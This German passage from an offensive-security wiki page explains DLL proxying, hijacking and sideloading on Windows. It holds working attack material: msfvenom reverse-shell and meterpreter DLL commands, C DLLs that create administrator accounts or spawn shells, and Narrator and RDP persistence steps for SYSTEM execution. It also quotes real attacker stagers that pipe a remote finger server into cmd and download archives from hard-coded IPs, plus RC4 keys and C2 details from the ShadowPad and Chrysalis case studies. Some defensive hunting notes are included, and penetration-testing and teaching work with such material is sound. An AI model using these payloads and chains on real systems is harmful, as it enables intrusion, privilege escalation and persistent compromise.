Im Wesentlichen ist ein **DLL-Proxy** eine DLL, die **beim Laden deinen bösartigen Code ausführen**, aber auch **wie erwartet funktionieren** und sich **wie erwartet verhalten** kann, indem sie alle Aufrufe an die echte Bibliothek weiterleitet.

Mit dem Tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) oder [**Spartacus**](https://github.com/Accenture/Spartacus) kannst du eine ausführbare Datei angeben und die Bibliothek auswählen, für die du einen Proxy erstellen möchtest, um eine **Proxy-DLL zu generieren**. Alternativ kannst du eine **DLL angeben** und eine **Proxy-DLL generieren**.

### **Meterpreter**

**Reverse Shell abrufen (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Einen Meterpreter (x86) erhalten:**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Einen Benutzer erstellen (x86; ich habe keine x64-Version gesehen):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Deine eigene

In vielen Fällen muss die DLL, die du kompilierst, **jede Funktion exportieren, die vom Opferprozess importiert wird**. Fehlt ein erforderlicher Export, kann die Binärdatei ihn nicht auflösen und der Exploit schlägt fehl.

<details>
<summary>C-DLL-Vorlage (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>C++-DLL-Beispiel mit Benutzererstellung</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>Alternative C-DLL mit Thread-Einstieg</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## Fallstudie: Narrator OneCore TTS Localization DLL Hijack (Barrierefreiheit/ATs)

Windows Narrator.exe prüft beim Start weiterhin eine vorhersehbare, sprachspezifische Localization-DLL, die für beliebige Codeausführung und Persistenz gekapert werden kann.<sup>[[7]](#references)</sup>

Wichtige Fakten
- Probe-Pfad (aktuelle Builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy-Pfad (ältere Builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Wenn am OneCore-Pfad eine beschreibbare, vom Angreifer kontrollierte DLL vorhanden ist, wird sie geladen und `DllMain(DLL_PROCESS_ATTACH)` ausgeführt. Es sind keine Exporte erforderlich.

Discovery mit Procmon
- Filter: `Process Name is Narrator.exe` und `Operation is Load Image` oder `CreateFile`.
- Narrator starten und den versuchten Ladevorgang des oben genannten Pfads beobachten.

Minimale DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC-Stille
- Ein naiver Hijack macht sich bemerkbar und hebt die UI hervor. Um unauffällig zu bleiben, enumeriere beim Attach die Narrator-Threads, öffne den Haupt-Thread (`OpenThread(THREAD_SUSPEND_RESUME)`) und suspendiere ihn mit `SuspendThread`; arbeite in deinem eigenen Thread weiter. Den vollständigen Code findest du im PoC.<sup>[[8]](#references)</sup>

Auslösen und Persistenz über die Accessibility-Konfiguration
- Benutzerkontext (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Mit den obigen Einstellungen lädt der Start von Narrator die abgelegte DLL. Drücke auf dem sicheren Desktop (Anmeldebildschirm) CTRL+WIN+ENTER, um Narrator zu starten; deine DLL wird auf dem sicheren Desktop als SYSTEM ausgeführt.

Durch RDP ausgelöste SYSTEM-Ausführung (laterale Bewegung)
- Klassische RDP-Sicherheitsebene zulassen: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Stelle eine RDP-Verbindung zum Host her und drücke am Anmeldebildschirm CTRL+WIN+ENTER, um Narrator zu starten; deine DLL wird auf dem sicheren Desktop als SYSTEM ausgeführt.
- Die Ausführung endet, wenn die RDP-Sitzung geschlossen wird – injiziere/migriere daher umgehend.

Bring Your Own Accessibility (BYOA)
- Du kannst einen Registrierungseintrag eines integrierten Accessibility Tools (AT) klonen (z. B. CursorIndicator), so bearbeiten, dass er auf eine beliebige Binary/DLL verweist, ihn importieren und dann `configuration` auf den Namen dieses AT setzen. So wird beliebige Ausführung über das Accessibility-Framework vermittelt.

Hinweise
- Das Schreiben in `%windir%\System32` und das Ändern von HKLM-Werten erfordern Admin-Rechte.
- Die gesamte Payload-Logik kann in `DLL_PROCESS_ATTACH` untergebracht werden; Exports sind nicht erforderlich.

## Fallstudie: CVE-2025-1729 – Privilegienausweitung mit TPQMAssistant.exe

Dieser Fall zeigt **Phantom DLL Hijacking** in Lenovos TrackPoint Quick Menu (`TPQMAssistant.exe`), dokumentiert als **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Details der Sicherheitslücke

- **Komponente**: `TPQMAssistant.exe` unter `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Geplante Aufgabe**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` wird täglich um 9:30 Uhr im Kontext des angemeldeten Benutzers ausgeführt.
- **Verzeichnisberechtigungen**: Für `CREATOR OWNER` beschreibbar, sodass lokale Benutzer beliebige Dateien ablegen können.
- **DLL-Suchverhalten**: Versucht zuerst, `hostfxr.dll` aus dem Arbeitsverzeichnis zu laden, und protokolliert „NAME NOT FOUND“, wenn die DLL fehlt. Das deutet darauf hin, dass das lokale Verzeichnis bei der Suche Vorrang hat.

### Exploit-Implementierung

Ein Angreifer kann einen bösartigen `hostfxr.dll`-Stub im selben Verzeichnis ablegen und so die fehlende DLL ausnutzen, um Code im Kontext des Benutzers auszuführen:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Angriffsablauf

1. Lege als Standardbenutzer `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\` ab.
2. Warte, bis die geplante Aufgabe um 9:30 Uhr im Kontext des aktuellen Benutzers ausgeführt wird.
3. Wenn bei Ausführung der Aufgabe ein Administrator angemeldet ist, wird die bösartige DLL in der Sitzung des Administrators mit mittlerer Integritätsstufe ausgeführt.
4. Verknüpfe gängige UAC-Bypass-Techniken, um von mittlerer Integritätsstufe zu SYSTEM-Rechten zu gelangen.

## Fallstudie: MSI CustomAction Dropper + DLL Side-Loading über signierten Host (wsc_proxy.exe)

Bedrohungsakteure kombinieren häufig MSI-basierte Dropper mit DLL Side-Loading, um Payloads unter einem vertrauenswürdigen, signierten Prozess auszuführen.<sup>[[10]](#references)</sup>

Übersicht der Angriffskette
- Der Benutzer lädt eine MSI-Datei herunter. Während der Installation über die GUI führt eine CustomAction unbemerkt Aktionen aus (z. B. LaunchApplication oder eine VBScript-Aktion) und rekonstruiert die nächste Stufe aus eingebetteten Ressourcen.
- Der Dropper schreibt eine legitime, signierte EXE-Datei und eine bösartige DLL in dasselbe Verzeichnis (Beispielpaar: von Avast signierte wsc_proxy.exe + vom Angreifer kontrollierte wsc.dll).
- Beim Start der signierten EXE lädt die Windows-DLL-Suchreihenfolge zuerst wsc.dll aus dem Arbeitsverzeichnis und führt so Angreifercode unter einem signierten übergeordneten Prozess aus (ATT&CK T1574.001).

MSI-Analyse (worauf zu achten ist)
- Tabelle CustomAction:
  - Suche nach Einträgen, die ausführbare Dateien oder VBScript starten. Beispiel für ein verdächtiges Muster: LaunchApplication führt im Hintergrund eine eingebettete Datei aus.
  - Prüfe in Orca (Microsoft Orca.exe) die Tabellen CustomAction, InstallExecuteSequence und Binary.
- Eingebettete/aufgeteilte Payloads in der MSI-CAB-Datei:
  - Administrative Extraktion: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Oder verwende lessmsi: lessmsi x package.msi C:\out
  - Suche nach mehreren kleinen Fragmenten, die von einer VBScript-CustomAction verkettet und entschlüsselt werden. Typischer Ablauf:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Praktisches Sideloading mit wsc_proxy.exe
- Lege diese beiden Dateien im selben Ordner ab:
  - wsc_proxy.exe: legitimer, signierter Host (Avast). Der Prozess versucht, wsc.dll anhand des Namens aus seinem Verzeichnis zu laden.
  - wsc.dll: angreifereigene DLL. Sind keine bestimmten Exports erforderlich, genügt DllMain; andernfalls erstelle eine Proxy-DLL und leite erforderliche Exports an die echte Bibliothek weiter, während du den Payload in DllMain ausführst.
- Erstelle einen minimalen DLL-Payload:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Für Exportanforderungen ein Proxying-Framework (z. B. DLLirant/Spartacus) verwenden, um eine Forwarding-DLL zu erstellen, die zusätzlich deine Payload ausführt.

- Diese Technik beruht auf der DLL-Namensauflösung durch die Host-Binärdatei. Verwendet der Host absolute Pfade oder sichere Lade-Flags (z. B. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), kann das Hijacking fehlschlagen.
- KnownDLLs, SxS und weitergeleitete Exports können die Reihenfolge beeinflussen und müssen bei der Auswahl der Host-Binärdatei und des Export-Sets berücksichtigt werden.

## Signierte Triaden + verschlüsselte Payloads (ShadowPad-Fallstudie)

Check Point beschrieb, wie Ink Dragon ShadowPad mithilfe einer **Drei-Dateien-Triade** einsetzt, die sich in legitime Software einfügt und gleichzeitig die Kern-Payload auf dem Datenträger verschlüsselt hält:<sup>[[12]](#references)</sup>

1. **Signierte Host-EXE** – Hersteller wie AMD, Realtek oder NVIDIA werden missbraucht (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Die Angreifer benennen die ausführbare Datei um, sodass sie wie eine Windows-Binärdatei aussieht (zum Beispiel `conhost.exe`), während die Authenticode-Signatur gültig bleibt.
2. **Bösartige Loader-DLL** – wird neben der EXE unter einem erwarteten Namen abgelegt (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Die DLL ist üblicherweise eine mit dem ScatterBrain-Framework verschleierte MFC-Binärdatei. Ihre einzige Aufgabe besteht darin, das verschlüsselte Blob zu finden, es zu entschlüsseln und ShadowPad reflektiv abzubilden.
3. **Verschlüsseltes Payload-Blob** – wird oft als `<name>.tmp` im selben Verzeichnis gespeichert. Nachdem die entschlüsselte Payload in den Arbeitsspeicher abgebildet wurde, löscht der Loader die TMP-Datei, um forensische Spuren zu beseitigen.

Hinweise zur Tradecraft:

* Durch das Umbenennen der signierten EXE (bei Beibehaltung des ursprünglichen `OriginalFileName` im PE-Header) kann sie sich als Windows-Binärdatei tarnen und zugleich die Herstellersignatur behalten. Orientiere dich daher an Ink Dragons Vorgehen, `conhost.exe`-ähnliche Binärdateien abzulegen, bei denen es sich tatsächlich um AMD-/NVIDIA-Dienstprogramme handelt.
* Da die ausführbare Datei vertrauenswürdig bleibt, muss bei den meisten Allowlisting-Kontrollen nur deine bösartige DLL daneben liegen. Konzentriere dich auf die Anpassung der Loader-DLL; der signierte Parent kann in der Regel unverändert ausgeführt werden.
* ShadowPads Decryptor erwartet, dass sich das TMP-Blob neben dem Loader befindet und beschreibbar ist, damit er die Datei nach dem Mapping mit Nullen überschreiben kann. Das Verzeichnis muss beschreibbar bleiben, bis die Payload geladen ist. Sobald sie sich im Arbeitsspeicher befindet, kann die TMP-Datei für OPSEC sicher gelöscht werden.

### LOLBAS-Stager + Sideloading-Kette mit gestaffeltem Archiv (finger → tar/curl → WMI)

Operatoren kombinieren DLL-Sideloading mit LOLBAS, sodass das einzige benutzerdefinierte Artefakt auf dem Datenträger die bösartige DLL neben der vertrauenswürdigen EXE ist:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Verstecktes PowerShell startet `cmd.exe /c`, ruft Befehle von einem Finger-Server ab und leitet sie an `cmd` weiter:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` ruft Text über TCP/79 ab; `| cmd` führt die Serverantwort aus, sodass Operatoren die zweite Stufe serverseitig austauschen können.

- **Integriertes Herunterladen/Entpacken:** Lade ein Archiv mit einer unverdächtigen Dateiendung herunter, entpacke es und platziere das Sideload-Ziel sowie die DLL in einem zufällig benannten Ordner unter `%LocalAppData%`:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` blendet den Fortschritt aus und folgt Weiterleitungen; `tar -xf` verwendet das integrierte Windows-Programm tar.

- **WMI/CIM-Start:** Starte die EXE über WMI, sodass die Telemetrie einen von CIM erstellten Prozess anzeigt, während dieser die DLL aus demselben Verzeichnis lädt:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Funktioniert mit Binärdateien, die lokale DLLs bevorzugen (z. B. `intelbq.exe`, `nearby_share.exe`); die Payload (z. B. Remcos) läuft unter einem vertrauenswürdigen Namen.

- **Hunting:** Bei `forfiles` alarmieren, wenn `/p`, `/m` und `/c` gemeinsam vorkommen; außerhalb von Admin-Skripten ist das ungewöhnlich.


## Fallstudie: NSIS-Dropper + Bitdefender Submission Wizard-Sideload (Chrysalis)

Bei einem jüngeren Lotus-Blossom-Angriff wurde eine vertrauenswürdige Update-Kette missbraucht, um einen mit NSIS gepackten Dropper zu verbreiten, der einen DLL-Sideload sowie vollständig im Arbeitsspeicher ausgeführte Payloads vorbereitete.<sup>[[13]](#references)</sup>

Ablauf des Tradecrafts
- `update.exe` (NSIS) erstellt `%AppData%\Bluetooth`, markiert den Ordner als **HIDDEN**, legt eine umbenannte Bitdefender Submission Wizard-Datei `BluetoothService.exe`, eine schädliche `log.dll` und einen verschlüsselten Blob `BluetoothService` ab und startet anschließend die EXE.
- Die Host-EXE importiert `log.dll` und ruft `LogInit`/`LogWrite` auf. `LogInit` lädt den Blob per mmap; `LogWrite` entschlüsselt ihn mit einem benutzerdefinierten, LCG-basierten Stream (Konstanten **0x19660D** / **0x3C6EF35F**, Schlüsselmaterial aus einem vorherigen Hash abgeleitet), überschreibt den Puffer mit Klartext-Shellcode, gibt temporäre Daten frei und springt zu diesem.
- Um eine IAT zu vermeiden, löst der Loader APIs auf, indem er Exportnamen mit **FNV-1a basis 0x811C9DC5 + prime 0x1000193** hasht, anschließend einen Murmur-ähnlichen Avalanche-Schritt (**0x85EBCA6B**) anwendet und mit gesalzenen Ziel-Hashes vergleicht.

Haupt-Shellcode (Chrysalis)
- Entschlüsselt ein PE-ähnliches Hauptmodul, indem er in fünf Durchläufen wiederholt Addition/XOR/Subtraktion mit dem Schlüssel `gQ2JR&9;` ausführt, und lädt anschließend dynamisch `Kernel32.dll` → `GetProcAddress`, um die Importauflösung abzuschließen.
- Rekonstruiert DLL-Namensstrings zur Laufzeit mithilfe von Bit-Rotations-/XOR-Transformationen pro Zeichen und lädt anschließend `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Verwendet einen zweiten Resolver, der die **PEB → InMemoryOrderModuleList** durchläuft, jede Exporttabelle in 4-Byte-Blöcken mit Murmur-ähnlichem Mixing parst und nur dann auf `GetProcAddress` zurückgreift, wenn der Hash nicht gefunden wird.

Eingebettete Konfiguration & C2
- Die Konfiguration befindet sich in der abgelegten Datei `BluetoothService` bei **Offset 0x30808** (Größe **0x980**) und wird mit dem Schlüssel `qwhvb^435h&*7` per RC4 entschlüsselt, wodurch die C2-URL und der User-Agent offengelegt werden.
- Beacons erstellen ein durch Punkte getrenntes Host-Profil, stellen das Tag `4Q` voran und verschlüsseln es anschließend per RC4 mit dem Schlüssel `vAuig34%^325hGV`, bevor sie es über HTTPS an `HttpSendRequestA` übergeben. Antworten werden per RC4 entschlüsselt und über einen Tag-Switch verarbeitet (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Der Ausführungsmodus wird durch CLI-Argumente gesteuert: keine Argumente = Persistenz installieren (Service/Run key), die auf `-i` verweist; `-i` startet sich selbst mit `-k` neu; `-k` überspringt die Installation und führt die Payload aus.

Beobachteter alternativer Loader
- Derselbe Angriff installierte Tiny C Compiler und führte `svchost.exe -nostdlib -run conf.c` aus `C:\ProgramData\USOShared\` aus, wobei `libtcc.dll` daneben lag. Der vom Angreifer bereitgestellte C-Quellcode enthielt Shellcode, der kompiliert und im Arbeitsspeicher ausgeführt wurde, ohne eine PE-Datei auf die Festplatte zu schreiben. Repliziere dies mit:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Diese auf TCC basierende Kompilier- und Ausführungsphase importierte `Wininet.dll` zur Laufzeit und rief Shellcode der zweiten Stufe von einer fest codierten URL ab. Dadurch entstand ein flexibler Loader, der sich als Compilerlauf ausgab.

## Signed-Host-Sideloading mit Export-Proxying und Host-Thread-Parking

Einige DLL-Sideloading-Ketten setzen auf **Stabilitätsmaßnahmen**, damit der legitime Host lange genug aktiv bleibt, um spätere Stufen sauber zu laden, statt nach dem Laden der bösartigen DLL abzustürzen.<sup>[[11]](#references)</sup>

Beobachtetes Muster
- Eine vertrauenswürdige EXE neben einer bösartigen DLL mit dem erwarteten Abhängigkeitsnamen ablegen, zum Beispiel `version.dll`.
- Die bösartige DLL **proxyt alle erwarteten Exporte** an die echte System-DLL (zum Beispiel `%SystemRoot%\\System32\\version.dll`), sodass die Importauflösung weiterhin funktioniert und der Hostprozess weiterläuft.
- Nach dem Laden patcht die bösartige DLL den Einstiegspunkt des Hosts, sodass der Hauptthread in eine Endlosschleife mit `Sleep` gerät, statt den Prozess zu beenden oder Codepfade auszuführen, die ihn beenden würden.
- Ein neuer Thread führt die eigentliche bösartige Aktion aus: Er entschlüsselt den Namen oder Pfad der DLL der nächsten Stufe (RC4/XOR sind üblich) und startet sie anschließend mit `LoadLibrary`.

Warum das wichtig ist
- Normales DLL-Proxying erhält die API-Kompatibilität, garantiert aber nicht, dass der Host lange genug für spätere Stufen aktiv bleibt.
- Den Hauptthread mit `Sleep(INFINITE)` anzuhalten, ist eine einfache Möglichkeit, den signierten Prozess aktiv zu halten, während der Loader die Entschlüsselung, das Staging oder den Netzwerk-Bootstrap in einem Worker-Thread durchführt.
- Wer nur nach einer verdächtigen `DllMain` sucht, übersieht dieses Muster möglicherweise, wenn das auffällige Verhalten erst nach dem Patchen des Host-Einstiegspunkts und dem Starten eines zweiten Threads auftritt.

Minimaler Ablauf
1. Die signierte Host-EXE kopieren und ermitteln, welche DLL sie aus dem lokalen Verzeichnis lädt.
2. Eine Proxy-DLL erstellen, die dieselben Funktionen exportiert und sie an die legitime DLL weiterleitet.
3. In `DllMain(DLL_PROCESS_ATTACH)` einen Worker-Thread erstellen.
4. Von diesem Thread aus den Host-Einstiegspunkt oder die Start-Routine des Hauptthreads so patchen, dass sie in einer `Sleep`-Schleife läuft.
5. Den Namen/die Konfiguration der DLL der nächsten Stufe entschlüsseln und `LoadLibrary` aufrufen oder die Payload manuell in den Speicher abbilden.

Ansatzpunkte für die Abwehr
- Signierte Prozesse, die `version.dll` oder ähnlich verbreitete Bibliotheken aus ihrem eigenen Anwendungsverzeichnis statt aus `System32` laden.
- Speicher-Patches am Prozesseinstiegspunkt kurz nach dem Laden des Images, insbesondere Sprünge/Aufrufe, die zu `Sleep`/`SleepEx` umgeleitet werden.
- Threads, die von einer Proxy-DLL erstellt werden und unmittelbar `LoadLibrary` mit einer DLL mit entschlüsseltem Namen aufrufen.
- Proxy-DLLs mit vollständigem Exportsatz, die neben Hersteller-EXEs in beschreibbaren Staging-Verzeichnissen wie `ProgramData`, `%TEMP%` oder entpackten Archivpfaden abgelegt werden.

## References

- [1] [Red Canary – Intelligence Insights: Januar 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 – Privilegieneskalation mit TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store – TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL-Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL-Hijacking in Windows: Einfaches C-Beispiel](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore setzt neue Malware gegen Europa ein](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: Wenn DLL-Hijacks auf Windows-Hilfsprogramme treffen](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digitale Doppelgänger: Anatomie sich wandelnder Identitätskampagnen zur Verbreitung von Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Konvergierende Interessen: Analyse von Bedrohungsclustern, die eine südostasiatische Regierung ins Visier nehmen](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Einblick in Ink Dragon: Das Relay-Netzwerk und die Abläufe einer verdeckten Offensive im Detail](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Die Chrysalis-Backdoor: Ein tiefer Einblick in das Toolkit von Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno: ZipSlip-zu-DLL-Hijack-Kette](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Nachverfolgung der Spionagekampagnen von Iranian APT Screening Serpens aus dem Jahr 2026](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – Element `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – Element `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – Element `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – Element `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – Element `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – Element `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Schnell und rücksichtslos: Operationen von Nimbus Manticore während des iranischen Konflikts](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Aufgabenaktionen](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 nimmt südostasiatische Regierungen und kritische Infrastruktur ins Visier](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
